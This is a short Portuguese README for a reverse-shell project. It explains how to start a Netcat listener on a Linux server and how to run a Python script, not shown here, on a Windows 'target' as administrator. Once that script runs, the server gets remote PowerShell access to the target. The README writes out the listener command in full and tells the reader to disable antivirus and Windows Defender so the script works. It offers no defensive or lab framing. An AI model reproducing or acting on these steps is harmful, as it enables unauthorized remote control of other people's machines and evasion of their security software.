# Reverse Shell

Este projeto cria uma conexão de reverse shell entre um alvo e um servidor, permitindo controle remoto da máquina alvo através de um servidor Linux.

## Como funciona:

1. **Servidor:**
   - O servidor está configurado para ouvir uma porta específica usando `Netcat` (ou `nc`).
   - Se certifique que o seu servidor tem a porta desejada aberta.
   - Ele aguarda a conexão de um cliente (a máquina alvo) que se conectará ao servidor, dando acesso ao terminal do windows..

2. **Configuração do `Netcat`:**
   - O servidor deve executar o seguinte comando no terminal para escutar a porta:
   ```bash
   stty raw -echo; (stty size; cat) | nc -lvnp {PORTA} -s 0.0.0.0

3. **Máquina Alvo:**
   - Uma vez que o servidor está escutando a porta escolhida, é hora da máquina alvo executar o código Python. Uma vez que isso for feito, o servidor terá acesso ao terminal do powershell do PC alvo.
   - Acesse o arquivo "reverseshell.py" e modifique as variáveis "IP" e "PORT" para satisfazer a configuração do seu servidor. Após isso, execute o script como administrador e o servidor terá acesso ao terminal.
   - **Talvez seja necessário desativar o antivírus e o Windows Defender para o script funcionar!**
